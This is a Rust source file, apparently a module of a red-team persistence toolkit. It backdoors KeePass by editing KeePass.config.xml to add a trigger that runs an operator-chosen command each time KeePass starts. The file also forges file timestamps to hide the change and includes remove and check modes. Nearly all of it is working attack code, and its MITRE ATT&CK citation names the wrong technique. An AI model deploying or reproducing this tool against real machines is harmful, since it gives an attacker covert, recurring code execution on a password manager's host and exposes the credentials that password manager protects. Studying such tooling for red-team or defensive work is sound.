// KeePass Configuration Backdoor
//
// Backdoors KeePass configuration file to execute arbitrary commands when KeePass triggers.
// Modifies KeePass.config.xml to add a trigger that executes on application startup.
//
// MITRE ATT&CK Technique: T1546.015 - Event Triggered Execution: Component Object Model Hijacking
// https://attack.mitre.org/techniques/T1546/015/

use crate::core::config::{Method, PersistConfig};
use crate::core::error::{PersistError, Result};
use crate::helpers::utils;
use log::info;
use std::fs;
use std::path::Path;

#[cfg(target_os = "windows")]
use std::time::SystemTime;

/// Execute KeePass backdoor operation based on configuration
pub fn execute(config: &PersistConfig) -> Result<()> {
    match config.method {
        Method::Add => add_persistence(config),
        Method::Remove => remove_persistence(config),
        Method::Check => check_persistence(config).map(|r| print_check_result(&r)),
        Method::List => list_persistence(),
    }
}

/// Add KeePass backdoor
fn add_persistence(config: &PersistConfig) -> Result<()> {
    let command = config
        .command
        .as_ref()
        .ok_or_else(|| PersistError::MissingParameter("command".to_string()))?;

    let file_path = config
        .file_path
        .as_ref()
        .ok_or_else(|| PersistError::MissingParameter("file_path".to_string()))?;

    info!("Adding KeePass backdoor persistence");
    info!("Command: {}", command);
    info!("File Path: {}", file_path);

    let path = Path::new(file_path);

    // Check if file exists
    if !path.exists() {
        return Err(PersistError::NotFound(format!(
            "KeePass config file not found: {}",
            file_path
        )));
    }

    // Check if KeePass is running (simplified check)
    if is_keepass_running() {
        return Err(PersistError::OperationFailed(
            "KeePass is currently running. Please close KeePass before backdooring config file"
                .to_string(),
        ));
    }

    // Read file contents
    let contents = fs::read_to_string(path)?;

    // Verify it's a KeePass config
    if !contents.contains("TriggerSystem") {
        return Err(PersistError::InvalidInput(
            "This is NOT a KeePass config file".to_string(),
        ));
    }

    // Get file metadata for timestamp preservation
    #[cfg(target_os = "windows")]
    let metadata = fs::metadata(path)?;

    // Create backup
    let backup_path = format!("{}.bak", file_path);
    fs::copy(path, &backup_path)?;

    // Preserve timestamps on backup
    #[cfg(target_os = "windows")]
    preserve_timestamps(&backup_path, &metadata)?;

    // Build command with arguments
    let full_command = if let Some(args) = &config.command_arg {
        format!("{} {}", command, args)
    } else {
        command.clone()
    };

    // Create backdoor content
    let backdoor_content = format!(
        r#"
            <Triggers>
            <Trigger>
                <Guid>Z26+bdu9zUO8LXO0Gcw1Gw==</Guid>
                <Name>Debug</Name>
                <Events>
                    <Event>
                        <TypeGuid>5f8TBoW4QYm5BvaeKztApw==</TypeGuid>
                           <Parameters>
                               <Parameter>0</Parameter>
                               <Parameter/>
                           </Parameters>
                       </Event>
                   </Events>
                   <Conditions/>
                   <Actions>
                       <Action>
                           <TypeGuid>2uX4OwcwTBOe7y66y27kxw==</TypeGuid>
                              <Parameters>
                                     <Parameter>{}</Parameter>
                                        <Parameter>{}</Parameter>
                                           <Parameter>False</Parameter>
                                           <Parameter>1</Parameter>
                                           <Parameter/>
                                       </Parameters>
                                   </Action>
                               </Actions>
                           </Trigger>
                           </Triggers>
                           "#,
        command,
        config.command_arg.as_deref().unwrap_or("")
    );

    // Replace <Triggers /> with backdoored content
    let backdoored_contents = contents.replace("<Triggers />", &backdoor_content);

    // Write backdoored config
    fs::write(path, backdoored_contents)?;

    // Preserve original timestamps
    #[cfg(target_os = "windows")]
    preserve_timestamps(file_path, &metadata)?;

    // Get SHA256 hashes
    let original_hash = utils::sha256_checksum(&backup_path)?;
    let backdoored_hash = utils::sha256_checksum(file_path)?;

    println!();
    println!("[+] SUCCESS: KeePass persistence backdoor added");
    println!(
        "[*] INFO: Location of original KeePass config file: {}",
        backup_path
    );
    println!(
        "[*] INFO: Location of backdoored KeePass config file: {}",
        file_path
    );
    println!(
        "[*] INFO: SHA256 Hash of original KeePass config file: {}",
        original_hash
    );
    println!(
        "[*] INFO: SHA256 Hash of backdoored KeePass config file: {}",
        backdoored_hash
    );
    println!();

    Ok(())
}

/// Remove KeePass backdoor
fn remove_persistence(config: &PersistConfig) -> Result<()> {
    let file_path = config
        .file_path
        .as_ref()
        .ok_or_else(|| PersistError::MissingParameter("file_path".to_string()))?;

    info!("Removing KeePass backdoor persistence");
    info!("File Path: {}", file_path);

    // Check if KeePass is running
    if is_keepass_running() {
        return Err(PersistError::OperationFailed(
            "KeePass is currently running. Please close KeePass before removing backdoor"
                .to_string(),
        ));
    }

    let backup_path = format!("{}.bak", file_path);

    // Check if backup exists
    if !Path::new(&backup_path).exists() {
        return Err(PersistError::NotFound(
            "Backup config file not found. Cannot restore".to_string(),
        ));
    }

    // Get backup metadata
    #[cfg(target_os = "windows")]
    let metadata = fs::metadata(&backup_path)?;

    // Delete backdoored config
    fs::remove_file(file_path)?;

    // Restore backup
    fs::rename(&backup_path, file_path)?;

    // Preserve timestamps
    #[cfg(target_os = "windows")]
    preserve_timestamps(file_path, &metadata)?;

    println!();
    println!("[+] SUCCESS: KeePass persistence backdoor removed");
    println!();

    Ok(())
}

/// Check if KeePass backdoor can be added
fn check_persistence(config: &PersistConfig) -> Result<CheckResult> {
    let mut result = CheckResult::new();

    if let Some(file_path) = &config.file_path {
        let path = Path::new(file_path);

        // Check if file exists
        if path.exists() {
            result.add_success(format!("KeePass config file exists: {}", file_path));

            // Check if it's a KeePass config
            if let Ok(contents) = fs::read_to_string(path) {
                if contents.contains("TriggerSystem") {
                    result.add_success("File is a valid KeePass config".to_string());

                    // Check if already backdoored
                    if contents.contains("2uX4OwcwTBOe7y66y27kxw==") {
                        result.add_error("KeePass config is already backdoored".to_string());
                    } else {
                        result.add_success("KeePass config is NOT backdoored".to_string());
                    }
                } else {
                    result.add_error("File is NOT a KeePass config".to_string());
                }
            }
        } else {
            result.add_error(format!("KeePass config file NOT found: {}", file_path));
        }
    }

    // Check if KeePass is running
    if is_keepass_running() {
        result.add_error(
            "KeePass is currently running (must be closed to backdoor config)".to_string(),
        );
    } else {
        result.add_success("KeePass is not currently running".to_string());
    }

    // Check for required parameters
    if config.command.is_none() || config.file_path.is_none() {
        result.add_error("Must provide both --command and --file-path".to_string());
    } else {
        result.add_success("Correct arguments provided".to_string());
    }

    Ok(result)
}

/// List persistence (not supported for KeePass)
fn list_persistence() -> Result<()> {
    println!();
    println!("[-] ERROR: List command not supported for KeePass technique");
    println!();
    Ok(())
}

/// Check if KeePass process is running (simplified)
fn is_keepass_running() -> bool {
    #[cfg(target_os = "windows")]
    {
        use std::process::Command;

        // Use tasklist to check for KeePass processes
        if let Ok(output) = Command::new("tasklist")
            .arg("/FI")
            .arg("IMAGENAME eq KeePass.exe")
            .output()
        {
            if let Ok(stdout) = String::from_utf8(output.stdout) {
                return stdout.to_lowercase().contains("keepass");
            }
        }
    }

    false
}

/// Preserve file timestamps
#[cfg(target_os = "windows")]
fn preserve_timestamps(path: &str, metadata: &fs::Metadata) -> Result<()> {
    use std::os::windows::fs::MetadataExt;

    let accessed = metadata.accessed().unwrap_or_else(|_| SystemTime::now());
    let modified = metadata.modified().unwrap_or_else(|_| SystemTime::now());

    filetime::set_file_times(
        path,
        filetime::FileTime::from_system_time(accessed),
        filetime::FileTime::from_system_time(modified),
    )
    .map_err(|e| PersistError::Io(e))
}

/// Result of a check operation
#[derive(Debug)]
struct CheckResult {
    successes: Vec<String>,
    errors: Vec<String>,
}

impl CheckResult {
    fn new() -> Self {
        Self {
            successes: Vec::new(),
            errors: Vec::new(),
        }
    }

    fn add_success(&mut self, msg: String) {
        self.successes.push(msg);
    }

    fn add_error(&mut self, msg: String) {
        self.errors.push(msg);
    }
}

fn print_check_result(result: &CheckResult) {
    println!();
    for success in &result.successes {
        println!("[+] SUCCESS: {}", success);
    }
    for error in &result.errors {
        println!("[-] ERROR: {}", error);
    }
    println!();
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_keepass_running() {
        // This should return false in test environment
        assert!(!is_keepass_running());
    }
}
